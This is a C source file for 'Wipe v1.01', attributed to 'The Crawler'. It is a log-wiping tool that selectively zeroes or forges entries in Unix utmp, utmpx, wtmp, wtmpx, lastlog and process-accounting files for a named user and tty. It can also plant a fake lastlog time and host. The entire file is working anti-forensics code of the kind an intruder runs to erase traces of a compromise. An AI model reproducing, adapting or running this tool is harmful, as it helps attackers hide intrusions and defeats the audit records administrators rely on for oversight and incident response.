/*
 * Wipe v1.01.
 *
 * Written by The Crawler.
 *
 * Selectively wipe system logs.
 *
 * Wipes logs on, but not including, Linux, FreeBSD, Sunos 4.x, Solaris 2.x,
 *      Ultrix, AIX, IRIX, Digital UNIX, BSDI, NetBSD, HP/UX.
 */

#include "feature.h"

#ifdef __FreeBSD__
#define ut_name ut_user
#endif

#define _XOPEN_SOURCE 500

#include <sys/types.h>
#include <sys/stat.h>
#include <sys/uio.h>
#ifdef HAVE_ACCT
#include <sys/acct.h>
#endif
#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
#include <ctype.h>
#include <string.h>
#include <pwd.h>
#include <time.h>
#include <stdlib.h>

#ifdef HAVE_SOLARIS
#include <strings.h>
#define HAVE_LASTLOG_H
#endif

#ifdef HAVE_LASTLOG_H
#include <lastlog.h>
#endif

#ifdef HAVE_UTMP
#include <utmp.h>
#endif

#ifdef HAVE_UTMPX
#include <utmpx.h>
#endif

#ifndef UTMP_FILE
#  ifdef _PATH_UTMP
#    define UTMP_FILE _PATH_UTMP
#  else
#    define UTMP_FILE "/var/adm/utmp"
#  endif
#endif

#ifndef WTMP_FILE
#  ifdef _PATH_WTMP
#    define WTMP_FILE _PATH_WTMP
#  else
#    define WTMP_FILE "/var/adm/wtmp"
#  endif
#endif

#ifndef LASTLOG_FILE
#  ifdef _PATH_LASTLOG
#    define LASTLOG_FILE _PATH_LASTLOG
#  else
#    define LASTLOG_FILE "/var/adm/lastlog"
#  endif
#endif

#ifndef ACCT_FILE
#  define ACCT_FILE "/var/adm/pacct"
#endif

#ifdef HAVE_UTMPX
#  ifndef UTMPX_FILE
#    define UTMPX_FILE "/var/adm/utmpx"
#  endif
#  ifndef WTMPX_FILE
#    define WTMPX_FILE "/var/adm/wtmpx"
#  endif
#endif

char *arg0;

inline char *basename(char *path) {
	char *p = strrchr(path, '/');
	return p ? p : path;
}

inline void bzero(void *s, size_t n) {
	memset(s, 0, n);
}

const char *types[] = {
#ifdef EMPTY
	[EMPTY]		= "EMPTY",
#endif
#ifdef RUN_LVL
	[RUN_LVL]	= "RUN_LVL",
#endif
	[BOOT_TIME]	= "BOOT_TIME",
	[NEW_TIME]	= "NEW_TIME",
	[OLD_TIME]	= "OLD_TIME",
	[INIT_PROCESS]	= "INIT_PROCESS",
	[LOGIN_PROCESS]	= "LOGIN_PROCESS",
	[USER_PROCESS]	= "USER_PROCESS",
	[DEAD_PROCESS]	= "DEAD_PROCESS",
#ifdef ACCOUNTING
	[ACCOUNTING]	= "ACCOUNTING",
#endif
};

void dump_utmp()
{
#ifdef HAVE_UTMP
	int fd;
	struct utmp ut;

	if ((fd = open(UTMP_FILE, O_RDONLY)) < 0) {
		fprintf(stderr, "fatal: could not open %s: %m\n", UTMP_FILE);
		return;
	}

#define str(var) (int) sizeof(var), var

	while (read(fd, &ut, sizeof(ut)) > 0) {
		printf("* type: %s\n"
		       "   pid: %u, sid: %u\n"
		       "  line: \"%.*s\"\n"
		       "    id: \"%.*s\"\n"
		       "  user: \"%.*s\"\n"
		       "  host: \"%.*s\"\n"
		       "\n",
			types[ut.ut_type],
			ut.ut_pid, ut.ut_session,
			str(ut.ut_line),
			str(ut.ut_id),
			str(ut.ut_user),
			str(ut.ut_host)
			);
	}

#undef str

	close(fd);
#endif
}

void wipe_utmp(char *name, char *line)
{
#ifdef HAVE_UTMP
	int fd;
	struct utmp ut;
	struct utmp new = { .ut_type = DEAD_PROCESS };

	if ((fd = open(UTMP_FILE, O_RDWR)) < 0) {
		fprintf(stderr, "fatal: could not open %s: %m\n", UTMP_FILE);
		return;
	}

	while (read(fd, &ut, sizeof(ut)) > 0) {
		if (name && strncmp(ut.ut_name, name, sizeof(ut.ut_name)))
			continue;
		if (line && strncmp(ut.ut_line, line, sizeof(ut.ut_line)))
			continue;
		printf("zeroing: id='%.*s' name='%.*s' line='%.*s'\n",
			(int) sizeof(ut.ut_id), ut.ut_id,
			(int) sizeof(ut.ut_name), ut.ut_name,
			(int) sizeof(ut.ut_line), ut.ut_line);
		lseek(fd, -sizeof(ut), SEEK_CUR);
		write(fd, &new, sizeof(ut));
	}

	close(fd);
#endif
}

void wipe_utmpx(char *name, char *line)
{
#ifdef HAVE_UTMPX
	int fd;
	struct utmpx utx;
	struct utmpx new = { .ut_type = DEAD_PROCESS };

	if ((fd = open(UTMPX_FILE, O_RDWR)) < 0) {
		fprintf(stderr, "fatal: could not open %s: %m\n", UTMPX_FILE);
		return;
	}

	while (read(fd, &utx, sizeof(utx)) > 0) {
		if (name && strncmp(utx.ut_name, name, sizeof(utx.ut_name)))
			continue;
		if (line && strncmp(utx.ut_line, line, sizeof(utx.ut_line)))
			continue;
		printf("zeroing: id='%.*s' name='%.*s' line='%.*s'\n",
			(int) sizeof(utx.ut_id), utx.ut_id,
			(int) sizeof(utx.ut_name), utx.ut_name,
			(int) sizeof(utx.ut_line), utx.ut_line);
		lseek(fd, -sizeof(utx), SEEK_CUR);
		write(fd, &new, sizeof(utx));
	}

	close(fd);
#endif
}

void wipe_wtmp(char *name, char *line)
{
#ifdef HAVE_UTMP
	int fd;
	struct utmp ut;
	struct utmp new = { .ut_type = DEAD_PROCESS };

	if ((fd = open(WTMP_FILE, O_RDWR)) < 0) {
		fprintf(stderr, "fatal: could not open %s: %m\n", WTMP_FILE);
		return;
	}

	lseek(fd, -sizeof(ut), SEEK_END);
	while ((read (fd, &ut, sizeof(ut))) > 0) {
		if (name && strncmp(ut.ut_name, name, sizeof(ut.ut_name)))
			goto skip;
		if (line && strncmp(ut.ut_line, line, sizeof(ut.ut_line)))
			goto skip;
		printf("zeroing: id='%.*s' name='%.*s' line='%.*s'\n",
			(int) sizeof(ut.ut_id), ut.ut_id,
			(int) sizeof(ut.ut_name), ut.ut_name,
			(int) sizeof(ut.ut_line), ut.ut_line);
		lseek(fd, -sizeof(ut), SEEK_CUR);
		write(fd, &new, sizeof(ut));
		break;
skip:
		lseek(fd, -(sizeof(ut) * 2), SEEK_CUR);
	}

	close(fd);
#endif
}

void wipe_wtmpx(char *name, char *line)
{
#ifdef HAVE_UTMPX
	int fd;
	struct utmpx utx;
	struct utmpx new = { .ut_type = DEAD_PROCESS };

	if ((fd = open(WTMPX_FILE, O_RDWR)) < 0) {
		fprintf(stderr, "fatal: could not open %s: %m\n", WTMPX_FILE);
		return;
	}

	lseek(fd, -sizeof(utx), SEEK_END);
	while ((read(fd, &utx, sizeof(utx))) > 0) {
		if (name && strncmp(utx.ut_name, name, sizeof(utx.ut_name)))
			goto skip;
		if (line && strncmp(utx.ut_line, line, sizeof(utx.ut_line)))
			goto skip;
		printf("zeroing: id='%.*s' name='%.*s' line='%.*s'\n",
			(int) sizeof(utx.ut_id), utx.ut_id,
			(int) sizeof(utx.ut_name), utx.ut_name,
			(int) sizeof(utx.ut_line), utx.ut_line);
		lseek(fd, -sizeof(utx), SEEK_CUR);
		write(fd, &new, sizeof(utx));
		break;
skip:
		lseek(fd, -(sizeof(utx) * 2), SEEK_CUR);
	}

	close(fd);
#endif
}

void wipe_lastlog(char *name, char *line, char *timestr, char *host)
{
#ifdef HAVE_LASTLOG
	int fd;
	struct lastlog ll;
	struct passwd *pw;
	struct tm tm;

	if ((pw = getpwnam(name)) == NULL) {
		fprintf(stderr, "fatal: could not find user '%s'\n", name);
		return;
	}

	if (timestr) {
		char *r = strptime(timestr, "%Y%m%d%H%M", &tm);
		if (!r) {
			fprintf(stderr, "fatal: failed to parse datetime\n");
			return;
		} else if (*r) {
			fprintf(stderr, "fatal: garbage after datetime: '%s'\n", r);
			return;
		}
	}

	printf("zeroing: uid=%u\n", pw->pw_uid);

	bzero(&ll, sizeof(ll));
	if (timestr)
		ll.ll_time = mktime(&tm);
	if (line)
		strncpy(ll.ll_line, line, sizeof(ll.ll_line));
	if (host)
		strncpy(ll.ll_host, host, sizeof(ll.ll_host));

	if ((fd = open(LASTLOG_FILE, O_RDWR)) < 0) {
		fprintf(stderr, "fatal: could not open %s: %m\n", LASTLOG_FILE);
		return;
	}

	lseek(fd, pw->pw_uid * sizeof(ll), SEEK_CUR);
	write(fd, &ll, sizeof(ll));

	close(fd);
#endif
}

void wipe_acct(char *name, char *line)
{
#ifdef HAVE_ACCT
	int fd;
	struct passwd *pw;
	char ttyn[50];
	struct stat st;
	struct acct_v3 ac;
	off_t pos = 0, skip = 0;

	if ((pw = getpwnam(name)) == NULL) {
		fprintf(stderr, "fatal: could not find user '%s'\n", name);
		return;
	}

	if ((fd = open(ACCT_FILE, O_RDWR)) < 0) {
		fprintf(stderr, "fatal: could not open %s: %m\n", ACCT_FILE);
		return;
	}

	snprintf(ttyn, sizeof(ttyn), "/dev/%s", line);
	if (stat(ttyn, &st) < 0) {
		fprintf(stderr, "fatal: could not determine device number for tty: %m\n");
		return;
	}

	while (pread(fd, &ac, sizeof(ac), pos) > 0) {
		printf("entry: uid=%u tty=%u\n", ac.ac_uid, ac.ac_tty);
		if (ac.ac_uid == pw->pw_uid && ac.ac_tty == st.st_rdev) {
			skip += sizeof(ac);
		} else if (skip > 0) {
			if (pwrite(fd, &ac, sizeof(ac), pos-skip) < 0) {
				printf("copying from @%lu to @%lu\n", pos, pos-skip);
				fprintf(stderr, "error: write failed: %m\n");
			}
		}
		pos += sizeof(ac);
	}

	if (skip > 0) {
		printf("skipped %lu entries\n", skip/sizeof(ac));
		printf("truncating to %lu (%lu entries)\n",
			pos-skip, (pos-skip)/sizeof(ac));
		ftruncate(fd, pos-skip);
	}

	close(fd);
#endif
}


void
usage()
{
	printf("Usage: %s {u|w|l|a} [args]\n", arg0);
	printf("\n");
#ifdef HAVE_UTMPX
	printf("utmpx (%s, %s)\n", UTMP_FILE, UTMPX_FILE);
#else
	printf("utmp (%s)\n", UTMP_FILE);
#endif
	printf("   u <user> [tty]                 erase all matching entries\n");
	printf("\n");
	printf("wtmp (%s)\n", WTMP_FILE);
	printf("   w <user> [tty]                 erase last entry for user\n");
	printf("\n");
	printf("lastlog (%s)\n", LASTLOG_FILE);
	printf("   l <user>                       blank entry for user\n");
	printf("   l <user> <tty> <time> <host>   alter entry for user\n");
	printf("\n");
#ifdef HAVE_ACCT
	printf("acct (%s)\n", ACCT_FILE);
	printf("   a <user> <tty>                 erase all matching entries\n");
	printf("\n");
#endif
	printf("Note: <time> is in the format YYYYMMddhhmm\n");
	exit(0);
}

int
main(int argc, char *argv[])
{
	char c;

	arg0 = basename(argv[0]);

	if (argc < 2)
		usage();

	c = tolower(argv[1][0]);

	switch (c) {
	case 'u': /* utmp */
#ifdef HAVE_UTMP
		if (argc == 2)
			dump_utmp();
		if (argc == 3)
			wipe_utmp(argv[2], (char *) NULL);
		if (argc == 4)
			wipe_utmp(argv[2], argv[3]);
#endif
#ifdef HAVE_UTMPX
		if (argc == 3)
			wipe_utmpx(argv[2], (char *) NULL);
		if (argc == 4)
			wipe_utmpx(argv[2], argv[3]);
#endif
		break;
	case 'w': /* wtmp */
#ifdef HAVE_UTMP
		if (argc == 3)
			wipe_wtmp(argv[2], (char *) NULL);
		if (argc == 4)
			wipe_wtmp(argv[2], argv[3]);
#endif
#ifdef HAVE_UTMPX
		if (argc == 3)
			wipe_wtmpx(argv[2], (char *) NULL);
		if (argc == 4)
			wipe_wtmpx(argv[2], argv[3]);
#endif
		break;
	case 'l': /* lastlog */
#ifdef HAVE_LASTLOG
		if (argc == 3)
			wipe_lastlog(argv[2], (char *) NULL,
				(char *) NULL, (char *) NULL);
		if (argc == 4)
			wipe_lastlog(argv[2], argv[3], (char *) NULL,
					(char *) NULL);
		if (argc == 5)
			wipe_lastlog(argv[2], argv[3], argv[4],
					(char *) NULL);
		if (argc == 6)
			wipe_lastlog(argv[2], argv[3], argv[4],
					argv[5]);
#else
		fprintf(stderr, "fatal: lastlog support unavailable\n");
#endif
		break;
	case 'a': /* acct */
#ifdef HAVE_ACCT
		if (argc != 4)
			usage();
		wipe_acct(argv[2], argv[3]);
#else
		fprintf(stderr, "fatal: acct support unavailable\n");
#endif
		break;
	default:
		fprintf(stderr, "fatal: unknown command '%s'\n", argv[1]);
		return 1;
	}

	return 0;
}

